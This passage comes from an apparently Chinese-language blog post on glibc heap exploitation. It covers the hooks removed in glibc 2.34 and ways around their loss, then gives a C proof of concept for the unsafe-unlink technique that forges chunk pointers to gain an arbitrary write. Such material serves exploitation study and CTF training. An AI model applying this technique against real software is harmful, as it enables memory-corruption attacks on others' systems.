SIZE_SZ)</span><br></code></pre></td></tr></table></figure><p>可以看到内存地址需要以0x10字节对齐。</p><h3 id="libc-2-34"><a href="#libc-2-34" class="headerlink" title="libc-2.34"></a>libc-2.34</h3><p>glibc-2.34 的到来给予了hook劫持沉重的一击，移除了以下几个hook符号：</p><blockquote><p>__free_hook</p><p>__malloc_hook</p><p>__realloc_hook</p><p>__memalign_hook</p><p>__after_morecore_hook</p></blockquote><h4 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h4><ol><li>利用IO_vtable</li><li>利用exit_hook</li><li>劫持返回地址进行ROP</li></ol><h2 id="unsafe-unlink"><a href="#unsafe-unlink" class="headerlink" title="unsafe unlink"></a>unsafe unlink</h2><p>unsafe-unlink利用chunkfree时的合并机制，实现了地址的任意读写</p><blockquote><p>使用条件：</p><ul><li>能够利用溢出或其他漏洞，将某chunk的size域的最低16进制位修改为0，例: 0x91 –&gt; 0x90</li></ul></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*这是一段unsafe-unlink的示例代码，我们在最后成功利用这个漏洞，</span><br><span class="hljs-comment">实现了对非堆上地址victimstring的内容更改*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">uint64_t</span> * chunk0_ptr;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    chunk0_ptr = (<span class="hljs-type">uint64_t</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);       <span class="hljs-comment">//chunk0</span><br>    <span class="hljs-type">uint64_t</span> *chunk1_ptr = (<span class="hljs-type">uint64_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);        <span class="hljs-comment">//chunk1</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;chunk0_ptr: %p -&gt; %p\n&quot;</span>,&amp;chunk0_ptr, chunk0_ptr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;victim chunk: %p\n\n&quot;</span>,chunk1_ptr);<br><br>    <span class="hljs-comment">/*pass the check:   (chunksize(p) != prev_size(next_chunk(P)) == False)</span><br><span class="hljs-comment">                        chunk0_ptr[1] = 0x0;// or 0x8, 0x80*/</span><br><br>    <span class="hljs-comment">//pass the check:   (p-&gt;fd-&gt;bk != p || p-&gt;bk-&gt;fd != p) == False</span><br><br>    chunk0_ptr [<span class="hljs-number">2</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr - <span class="hljs-number">0x18</span>;<br>    chunk0_ptr [<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) &amp;chunk0_ptr - <span class="hljs-number">0x10</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fake fd: %p = &amp;chunk0_ptr - 0x18&quot;</span>, (<span class="hljs-type">void</span>*)chunk0_ptr[<span class="hljs-number">2</span>]);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;fake bk: %p = &amp;chunk0_ptr - 0x10&quot;</span>, (<span class="hljs-type">void</span>*)chunk0_ptr[<span class="hljs-number">3</span>]);<br>    <br>    <span class="hljs-type">uint64_t</span> *chunk1_hdr = (<span class="hljs-type">void</span>*) chunk1_ptr - <span class="hljs-number">0x10</span>;<br>    chunk1_hdr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x80</span>;<br>    chunk1_hdr[<span class="hljs-number">1</span>] &amp;= ~<span class="hljs-number">1</span>;<br><br>    <span class="hljs-comment">/*  int *t[10], i;                  //tcache</span><br><span class="hljs-comment">        for(i=0; i&lt;7; i++)&#123;</span><br><span class="hljs-comment">            t[i] = malloc(0x80);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">        for(i=0;i&lt;7;i++)&#123;</span><br><span class="hljs-comment">            free(t[i]);</span><br><span class="hljs-comment">        &#125;;  */</span><br><br>    <span class="hljs-built_in">free</span>(chunk1_ptr);               <span class="hljs-comment">//unlink</span><br><br>    <span class="hljs-type">char</span> victim_string[<span class="hljs-number">8</span>] = <span class="hljs-string">&quot;AAAAAAA&quot;</span>;<br>    chunk0_ptr[<span class="hljs-number">3</span>] = (<span class="hljs-type">uint64_t</span>) victim_string;   <span class="hljs-comment">//overwrite itself</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;old value: %s\n&quot;</span>, victim_string);<br><br>    chunk0_ptr[<span class="hljs-number">0</span>] = <span class="hljs-number">0x42424242424242</span>LL;     <span class="hljs-comment">//over wirting victim_string</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;new Value: %s\n&quot;</span>, victim_string);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="示例图"><a href="#示例图" class="headerlink" title="示例图"></a>示例图</h4><p><img src="/img/article/6.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
